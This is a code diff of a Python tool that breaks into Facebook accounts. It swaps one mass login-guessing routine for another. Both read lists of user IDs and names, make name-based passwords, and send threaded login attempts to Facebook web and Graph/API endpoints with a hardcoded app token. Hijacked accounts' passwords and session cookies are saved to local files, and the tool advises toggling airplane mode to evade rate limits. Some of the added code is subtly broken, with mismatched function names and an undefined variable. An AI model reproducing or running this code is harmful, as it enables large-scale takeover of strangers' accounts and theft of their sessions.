@@ -119,222 +119,212 @@ def sintx_menu():
 ###---------------### FILE CLONING ###--------------- ###
 
 
-loop = 0
-oks = []
-cps = []
-twf = []
-ugen = []
-
-
-def ク克隆():
-    sintx_logo()
-    E = "/sdcard/"
-    prnt(pnl("[red][»] ENTER NAME OF YOUR FILE", width=95, style=_A))
-    F = input(f"{yellow}  [+] /sdcard/:{dark_gray} ")
-    G = E + F
-    try:
-        B = open(G, "r").read().splitlines()
-    except FileNotFoundError:
-        cd(1)
-        print(f"\n{lr}  [X] FILE NOT FOUND")
-        cd(3)
-        ク克隆()
-    A = []
-    prnt(
-        pnl(
-            "[sky_blue1][1] SYSTEM PASSWORD LIST\n[2] YOUR PASSWORD LIST",
-            width=90,
-            style=_A,
-            title="SELECT PASSWORD METHOD",
-        )
-    )
-    H = input(f"{red}  [›] CHOICE:{dark_gray} ")
-    if H in ["1", "01"]:
-        A.append("first last")
-        A.append("first123")
-        A.append("first12")
-        A.append("first143")
-        A.append("first12345")
-        A.append("first123456")
-        A.append("first_123")
-        A.append("maganda")
-        A.append("magandaako")
-        A.append("gandako")
-        A.append("ganda")
-        A.append("cuteako")
-        A.append("god143")
-        A.append("i love you")
-        A.append("firstpretty")
-        A.append("firstpogi")
-        A.append("firstigop")
-        A.append("firstdump")
-        A.append("potanginamo")
-        A.append("lastlast")
-        A.append("firstfirst")
-        A.append("firstganda")
-        A.append("firstmaganda")
-        A.append("blackpink")
-        A.append("jungkook")
-        A.append("pogiko")
-        A.append("pogiako")
-    else:
-        try:
-            prnt(
-                pnl(
-                    "[yellow][?] HOW MANY PASSWORD DO YOU WANT TO USE?",
-                    width=90,
-                    style=_A,
-                )
-            )
-            C = int(input(f"{green}  [›] ANSWER:{red} "))
-        except:
-            C = 1
-        prnt(
-            pnl(
-                "[yellow] first last, first123, first143, last123, last143",
-                width=90,
-                style=_A,
-                title="EXAMPLE PASSWORD",
-            )
-        )
-        for I in range(C):
-            A.append(input(f"{green}  [›] PASSWORD #{I+1}:{dark_gray} "))
-    with ThreadPool(max_workers=None) as J:
-        prnt(
-            pnl(
-                "[yellow][»] ON/OFF FIRST YOUR DATA FOR 5 SECONDS AND PRESS ENTER",
-                width=90,
-                style=_A,
-                title="INSTRUCTIONS",
-            )
-        )
-        input(f"{green}  [»] PRESS ENTER: ")
-        sintx_logo()
-        D = str(len(B))
-        prnt(
-            pnl(
-                "[yellow][»] NOT FOR SALE!",
-                width=90,
-                style=_A,
-                title="NOTICE!",
-            )
-        )
-        K = "[white][-] TOTAL IDS TO CLONE: " + D + "\n[-] RESULT PATH: SINTX FOLDER"
-        prnt(pnl(K, width=90, style=_A, title="FILE INFO"))
-        for L in B:
-            M, N = L.split("|")
-            O = A
-            J.submit(sinsAPI_, M, N, O, D)
-    P = "[»] HITS : " + str(len(oks))
-    Q = "\n[»] CPS  : " + str(len(cps))
-    print(_B)
-    prnt(pnl(P + Q, width=90, style=_A, title="PROCESS COMPLETED"))
-    input(f"{dark_gray}  [›] PRESS ENTER TO REFRESH ")
-    sintx_menu()
-
+def menu1():
+	logo()
+	fl = input(f'{W}[{G}â€¢{W}] PUT FILE PATH\033[38;5;46m : {G}')
+	try:
+		fil = open(fl,'r').read().splitlines()
+	except FileNotFoundError:
+		print(f"{W}{40*'='}");print(f'[{R}!{W}] FILE LOCATION NOT FOUND ');time.sleep(1);menu1()
+	print(f"{W}{40*'='}");print(f"{W}[{G}A{W}] {W}AUTO PASSWORD {W}\n{W}[{G}B{W}]{W} CHOICE PASSWORD{W}");line()
+	psx =input(f'[{G}+{W}] Choose : {G}')
+	if psx in ["1", "01","11","A","a"]:
+		print(f"{W}{40*'='}{E}");print(f'{W}[{G}A{W}] PASSWORD [{G}NORMAL PASS{W}]\n[{G}B{W}] PASSWORD [{G}FF PASS{W}]\n[{G}C{W}] PASSWORD [{G}HARD PASS{W}]');print(f"{W}{40*'='}{E}")
+		passx=input(f'{W}[{G}+{W}] Choose: {G}')
+		if passx in ["2", "02","22","B","a"]:
+			plist.append('name')
+			plist.append('Name')
+			plist.append('first12')
+			plist.append('first123')
+			plist.append('first1234')
+			plist.append('first12345')
+			plist.append('last123')
+			plist.append('last12345')
+			plist.append('first@')
+			plist.append('first@@')
+			plist.append('first@@@')
+			plist.append('first@@@@')
+			plist.append('first@@##')
+			plist.append('last@')
+			plist.append('last@@')
+			plist.append('last@@@')
+			plist.append('last@@@@')
+			plist.append('firstlast')
+			plist.append('first last')
+		if passx in ["3", "03","33","C","c"]:
+			plist.append('last12')
+			plist.append('name')
+			plist.append('last123')
+			plist.append('last1234')
+			plist.append('last12345')
+			plist.append('last@')
+			plist.append('last@@')
+			plist.append('last@@@')
+			plist.append('last@@@@')
+			plist.append('last@@##')
+			plist.append('last##')
+			plist.append('last@#')
+			plist.append('last@@@@@')
+			plist.append('first@@@@')
+			plist.append('first@')
+			plist.append('first@@')
+			plist.append('first@@@')
+			plist.append('first@@@@@')
+			plist.append('first@@##')
+			plist.append('first@#')
+			plist.append('first##')
+			plist.append('first123')
+			plist.append('first1234')
+			plist.append('first12345')
+			plist.append('first11')
+			plist.append('first22')
+			plist.append('firstlast')
+			plist.append('first last')
+		else:
+			plist.append('name')
+			plist.append('first123')
+			plist.append('last123')
+			plist.append('first@@')
+			plist.append('first last')
+			plist.append('firstlast')
+	else:
+		try:
+			logo();print(f'\t\t{G}6 BEST{W}');print (40*"=")
+			psl = int(input(f'[{G}+{W}] Limit : {G}'));print(f"{W}{40*'='}")
+		except:
+			psl=1
+		print(f"{W}{40*'='}");print(f'EXAMPLE: {G}first123{W},{G}last123{W},{G}firstlast{W},{G}name{W}');print (40*"=")
+		for ox in range(psl):
+			plist.append(input(f'{W}[{G}{ox+1}{W}] password : {G}'))
+	print(f"{W}{40*'='}");print(f'[{G}+{W}] Do you went show cp account (y/n)');line()
+	cx=input(f'[{G}+{W}] Choose: {G}')
+	if cx in ['n','N','no','NO','2']:
+		cpx.append(f'n')
+	else:
+		cpx.append(f'y')
+	print(f"{W}{40*'='}");print(f'[{G}+{W}] Do you went show cookie (y/n)');line()
+	ckiv=input(f'{W}[{G}+{W}] Choose: {G}')
+	if ckiv in ['n','N','no','NO','2']:
+		cokix.append(f'n')
+	else:
+		cokix.append(f'y')
+	print(f"{W}{40*'='}");print(f'{W}[{G}A{W}] METHOD [{G}1{W}]\n{W}[{G}B{W}] METHOD [{G}2{W}]\n{W}[{G}C{W}] METHOD [{G}3{W}]');line()
+	mxt=input(f'{W}[{G}+{W}] Choose: {G}')
+	with ThreadPool(max_workers=30) as tonxoys:
+		tid = str(len(fil))
+		logo();print(f'{W} [{G}â€¢{W}] TOTAL ID :\033[1;92m '+tid);print(f' {W}[{G}â€¢{W}] \033[38;5;46mTHE PROCESS HAS BEEN STARTED');print(f' [{G}â€¢{W}] \033[38;5;46mUSE AEROPLANE MODE IN EVERY 5 MIN ');print(40*"=")
+		for uuxxd in fil:
+			id,name= uuxxd.split(f'|')
+			psd=plist
+			if mxt in ['A','1',"a"]:
+				tonxoys.submit(normalfl,id,psd,name,tid)
+			if mxt in ['B',"2","b"]:
+				tonxoys.submit(graphfl,id,psd,name,tid)
+			elif mxt in ['C',"3","c"]:
+				tonxoys.submit(graphfl2,id,psd,name,tid)
 
 ###---------------### API (MBASIC) ###--------------- ###
 
-
-def sinsAPI_(uid, names, pxss_, tot4l):
-    F = names
-    A = uid
-    global loop, oks, cps
-    sys.stdout.write(
-        f"\r\r{dark_gray}  [SINTX] %s/%s - OKS: %s - CPS: %s\r "
-        % (loop, tot4l, len(oks), len(cps))
-    )
-    sys.stdout.flush()
-    C = requests.Session()
-    try:
-        G = F.split(" ")[0]
-        try:
-            D = F.split(" ")[1]
-        except:
-            D = "143"
-        L = G.lower()
-        M = D.lower()
-        for N in pxss_:
-            B = (
-                N.replace("First", G)
-                .replace("Last", D)
-                .replace("first", L)
-                .replace("last", M)
-            )
-            header = {
-                "authority": "m.facebook.com",
-                "method": "GET",
-                "scheme": "https",
-                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8",
-                "accept-encoding": "gzip, deflate, br",
-                "accept-language": "en-US,en;q=1",
-                "cache-control": "no-cache, no-store, must-revalidate",
-                "referer": "https://m.facebook.com/",
-                "sec-ch-ua": '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',
-                "sec-ch-ua-mobile": "?1",
-                "sec-ch-ua-platform": "Android",
-                "sec-fetch-dest": "document",
-                "sec-fetch-mode": "navigate",
-                "sec-fetch-site": "same-origin",
-                "sec-fetch-user": "?1",
-                "pragma": "no-cache",
-                "priority": "u=1",
-                "cross-origin-resource-policy": "cross-origin",
-                "upgrade-insecure-requests": "1",
-                "user-agent": str(PyBookAgents.random_ugen()),
-            }
-            I = C.get(
-                f"https://m.facebook.com/login/device-based/password/?uid={A}&flow=login_no_pin&refsrc=deprecated&_rdr"
-            )
-            S = {
-                "lsd": re.search('name="lsd" value="(.*?)"', str(I.text)).group(1),
-                "jazoest": re.search('name="jazoest" value="(.*?)"', str(I.text)).group(
-                    1
-                ),
-                "uid": A,
-                "next": "https://mbasic.facebook.com/login/save-device/",
-                "flow": "login_no_pin",
-                "pass": B,
-            }
-            C.post(
-                "https://m.facebook.com/login/device-based/validate-password/?shbl=0",
-                data=S,
-                allow_redirects=False,
-                headers=header,
-            ).text
-            J = C.cookies.get_dict().keys()
-            if "c_user" in J:
-                K = ";".join(
-                    ["%s=%s" % (A, B) for (A, B) in C.cookies.get_dict().items()]
-                )
-                open(sntxfldr + f"HITS-{date_month}.txt", "a").write(
-                    A + "|" + B + "~" + Scrape_Year(uid) + _B + K + "\n\n"
-                )
-                print(_B)
-                T = f"[white]UID  : {A}\nPASS : {B}\nYEAR : {Scrape_Year(uid)}"
-                E = pnl(
-                    T, width=90, style="bold pale_turquoise1", title="SINTX SUCCESSFUL"
-                )
-                prnt(E)
-                oks.append(A)
-                break
-            elif "checkpoint" in J:
-                cps.append(A)
-                print(_B)
-                U = f"[white]UID  : {A}\nPASS : {B}\nYEAR : {Scrape_Year(uid)}"
-                E = pnl(U, width=90, style="bold red", title="SINTX CHECKPOINT")
-                prnt(E)
-                open(sntxfldr + f"CPS-{date_month}.txt", "a").write(
-                    A + "|" + B + "~" + Scrape_Year(uid) + _B
-                )
-                break
-            else:
-                continue
-        loop += 1
-    except requests.exceptions.ConnectionError:
-        time.sleep(20)
-
-
+def nrmlrm(id,psd,tid,mytd):
+	global ok,cp,lop
+	session = requests.Session()
+	ua=random.choice(ugen)
+	for psw in psd:
+		sys.stdout.write(f'\r\r{BG}[{W}ARIYAN-M1{BG}]{E} {BG}[{G}{lop}{W}/{G}{tid}{BG}]{E} {BG}[{W}OK{W}:{G}%s{BG}]{E}'%(len(ok)));sys.stdout.flush()
+		ffb = session.get(f'https://'+mytd).text
+		datax={"lsd":re.search('name="lsd" value="(.*?)"', str(ffb)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(ffb)).group(1),"m_ts":re.search('name="m_ts" value="(.*?)"', str(ffb)).group(1),"li":re.search('name="li" value="(.*?)"', str(ffb)).group(1),"try_number":"0","unrecognized_tries":"0","email":id,"pass":psw,"login":"Log In"}
+		header={'authority': mytd,'method': 'GET','path': '/','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'accept-language': 'en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7',  'cache-control': 'max-age=0',    'sec-ch-prefers-color-scheme': 'light',   'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"', 'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"', 'sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','sec-ch-ua-platform-version': '"11.0.0"', 'sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'none','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': ua}
+		lo = session.post(f'https://{mytd}/login/device-based/regular/login/?refsrc',data=datax,headers=header).text
+		lcki=session.Cookie.get_dict().keys()
+		if 'c_user' in lcki:
+			coki=";".join([key+"="+value for key,value in session.Cookie.get_dict().items()])
+			iid = coki[151:166]
+			print(f'\r\r{G}[ARIYAN-OK] {iid} | {psw}{W}')
+			if 'y' in cokix:
+				print(f'\r\r{R}[{G}Cookie{R}]{W} : {G}{coki}{E}');print(f"{W}{40*'-'}{E}")
+			ok.append(id)
+			open('/sdcard/ARIYAN-OK.txt', 'a').write(iid+' | '+psw+' | '+id+'  ------------>>>'+coki+"\n")
+			break
+		elif 'checkpoint' in lcki:
+			coki=";".join([key+"="+value for key,value in session.Cookie.get_dict().items()])
+			iid = coki[141:156]
+			if 'y' in cpx:
+				print(f'\r\r{R}[ARIYAN-CP] {iid} | {psw}{W}')
+			cp.append(id)
+			open('/sdcard/ARIYAN-CP.txt', 'a').write(iid+' | '+psw+' | '+id+"\n")
+			break
+		else:continue
+	lop+=1
+def graphrm(id,psd,tid):
+	global ok,cp,lop
+	togg=[]
+	sys.stdout.write(f'\r\r{BG}[{W}ARIYAN-M2{BG}]{E} {BG}[{G}{lop}{W}/{G}{tid}{BG}]{E} {BG}[{W}OK{W}:{G}%s{BG}]{E}'%(len(ok)));sys.stdout.flush()
+	for psw in psd:
+		ua=random.choice(ugen)
+		#ua='[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=4.0,width=1440,height=2560};FBLC/en_US;FBCR/Meteor;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G920F;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]'
+		datax= {'adid': str(uuid.uuid4()),'format': 'json','device_id': str(uuid.uuid4()),'email': id,'password': psw,'generate_analytics_claims': '1', 'community_id': '','cpl': 'true','try_num': '1','family_device_id': str(uuid.uuid4()),'credentials_type': 'password','source': 'login','error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false','generate_session_Cookie': '1','generate_machine_id': '1','currently_logged_in_userid': '0','locale': 'en_GB','client_country_code': 'GB', 'fb_api_req_friendly_name': 'authenticate'}
+		header={'User-Agent': ua1(),'Accept-Encoding':  'gzip, deflate','Accept': '*/*', 'Connection': 'keep-alive','Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Friendly-Name': 'authenticate','X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)),'X-FB-Net-HNI': str(random.randint(20000, 40000)),'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 'X-FB-Connection-Type': 'unknown','Content-Type': 'application/x-www-form-urlencoded','X-FB-HTTP-Engine': 'Liger'}
+		twfx= 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
+		lo=requests.post('https://'+'b-gr'+'ap'+'h'+'.facebook.com/auth/login',data=datax,headers=header,allow_redirects=False).json()
+		if 'session_key' in lo:
+			cki = lo["session_Cookie"]
+			ck={}
+			for xk in cki:
+				ck.update({xk["name"]:xk["value"]})
+			coki = (";").join([ "%s=%s" % (key, value) for key, value in ck.items() ])
+			iid= re.findall('c_user=(.*);xs', coki)[0]
+			print(f'\r\r{G}[ARIYAN-OK] {iid} | {psw}{W}')
+			if 'y' in cokix:
+				print(f'\r\r{R}[{G}Cookie{R}]{W} : {G}{coki}{E}');print(f"{W}{40*'-'}{E}")
+			ok.append(id)
+			open('/sdcard/ARIYAN-OK.txt', 'a').write(iid+' | '+psw+' | '+id+'  ------------>>>'+coki+"\n")
+			break
+		elif twfx in str(lo):
+			iid = lo['error']['error_data']['uid']
+			print(f'\r\r{S}[ARIYAN-2F] {iid} | {psw}{W}')
+			open('/sdcard/ARIYAN-CP.txt', 'a').write(iid+' | '+psw+' | '+id+"\n")
+			twf.append(id)
+			break
+		elif 'www.facebook.com' in lo['error']['message']:
+			try:
+				iid = lo['error']['error_data']['uid']
+			except:
+				iid=id
+			if iid in ok:pass
+			else:
+				if 'y' in cpx:
+					print(f'\r\r{R}[ARIYAN-CP] {iid} | {psw}{W}')
+					
+				cp.append(id)
+				open('/sdcard/ARIYAN-CP.txt', 'a').write(iid+' | '+psw+' | '+id+"\n")
+				break
+		else:continue
+	lop+=1
+def apirm(id,psd,tid):
+	global ok,cp,lop
+	ton=[]
+	sys.stdout.write(f'\r\r{BG}[{W}ARIYAN-M3{BG}]{E} {BG}[{G}{lop}{W}/{G}{tid}{BG}]{E} {BG}[{W}OK{W}:{G}%s{BG}]{E}'%(len(ok)));sys.stdout.flush()
+	for psw in psd:
+		url = 'https://b-api.facebook.com/method/auth.login'
+		gtt=random.choice(gtxx)
+		ua="[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=4.0,width=1440,height=2560};FBLC/en_US;FBCR/Meteor;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G920F;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]"
+		dataxx={'adid':str(uuid.uuid4()), 'email':id, 'password':psw,'cpl':'true', 'credentials_type':'device_based_login_password',"source": "device_based_login",'error_detail_type':'button_with_disabled', 'source':'login','format':'json', 'generate_session_Cookie':'1','generate_analytics_claim':'1','generate_machine_id':'1',"locale":"en_US","client_country_code":"US",'device':gtt,'device_id':str(uuid.uuid4()), "method": "auth.login","fb_api_req_friendly_name": "authenticate", "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
+		header={'content-type':'application/x-www-form-urlencoded','x-fb-sim-hni':str(random.randint(2e4,4e4)),'x-fb-connection-type':'unknown','Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','api_key': '8114af471d039628db5c68cb127af936','user-agent':ua1(),'x-fb-net-hni':str(random.randint(2e4,4e4)),'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),'x-fb-connection-quality':'EXCELLENT','x-fb-friendly-name':'authenticate','accept-encoding':'gzip, deflate','x-fb-http-engine':	'Liger'}
+		datax={'email':id,'password':psw,'cpl':'true', 'credentials_type':'password',  'error_detail_type':'button_with_disabled', 'source':'login', 'format':'json', 'generate_session_Cookie':'1', 'generate_analytics_claim':'1','generate_machine_id':'1'}
+		lo = requests.post(url,data=datax,headers=header,allow_redirects=False).text
+		jsn = json.loads(lo)
+		if 'session_key' in jsn:
+			print(f'\r\r{G}[ARIYAN-OK] {iid} | {psw}{W}')
+			ok.append(id);open('/sdcard/ARIYAN-OK.txt', 'a').write(iid+' | '+psw+' | '+id+'\n') #+'  ------------>>>'+coki+"\n")
+			break
+		elif 'www.facebook.com' in jsn['error_msg']:
+			if 'y' in cpx:
+				print(f'\r\r{R}[ARIYAN-CP] {id} | {psw}{W}')
+			cp.append(id)
+			open('/sdcard/ARIYAN-CP.txt', 'a').write(id+' | '+psw+' | '+id+"\n")
+			break
+		else:continue
+	lop+=1
 ###---------------### START ###--------------- ###
 
 
